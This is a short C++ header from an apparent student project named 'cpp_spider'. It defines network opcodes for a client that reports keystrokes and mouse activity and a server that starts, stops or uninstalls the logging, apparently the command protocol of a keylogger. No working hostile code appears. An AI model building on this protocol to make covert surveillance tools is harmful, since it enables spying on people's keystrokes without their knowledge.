/*
** NetworkOpcode.hh for cpp_spider in /home/tarkick/repos/cpp_spider/include
**
** Made by tarkick
** Login   <tarkick@epitech.net>
**
** Started on  Mon Nov 07 18:41:46 2016 tarkick
** Last update Wed Nov 09 01:04:13 2016 tarkick
*/

#ifndef NETWORKOPCODE_HH_
# define NETWORKOPCODE_HH_

# include <cstdint>

namespace						Net
{

	namespace 					Opcode
	{

		enum class 				Client : uint16_t
		{
			CONFIRM 			= 1000,
			CONNECT 			= 1001,
			LOGGING 			= 1002,
			KEYLOG 				= 1003,
			MOUSELOG 			= 1004,
			MOUSEMOVLOG 		= 1005,
		};

		enum class 				Server : uint16_t
		{
				CONFIRM			= 2000,
				HANDSHAKE		= 2001,
				STOPLOG			= 2002,
				STARTLOG		= 2003,
				UNINST			= 2004,
			};

	}

};

#endif
